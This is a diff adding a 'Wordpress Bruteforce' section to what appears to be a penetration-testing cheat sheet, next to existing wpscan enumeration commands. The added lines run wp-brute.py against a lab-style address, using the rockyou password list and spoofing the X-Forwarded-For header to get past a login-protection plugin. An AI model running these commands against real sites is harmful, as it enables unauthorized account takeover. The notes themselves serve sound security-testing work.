@@ -192,6 +192,18 @@ wpscan --url [url] --enumerate ap --plugins-detection aggressive
 wpscan --url [target url] --enumerate u 
 ```
 
+### Wordpress Bruteforce
+
+* can brute force with `wpscan` however this tool works great
+
+```
+./wp-brute.py -c -u http://10.10.110.100:65000/wordpress -H X-Forwarded-For -l admin -P /usr/share/seclists/rockyou.txt
+[+] Plugin seems to be not installed, or the source IP or username is in whitelist.
+
+./wp-brute.py --exploit --url http://10.10.110.100:65000/wordpress --header X-Forwarded-For --login admin --passwordlist /usr/share/seclists/rockyou.txt --quiet
+./wp-brute.py --exploit --url http://10.10.110.100:65000/wordpress --header X-Forwarded-For --login admin --passwordlist ../../10.10.110.100/list.txt
+```
+
 ### BFAC
 
 * Advanced backup-file artifacts for testing web applications
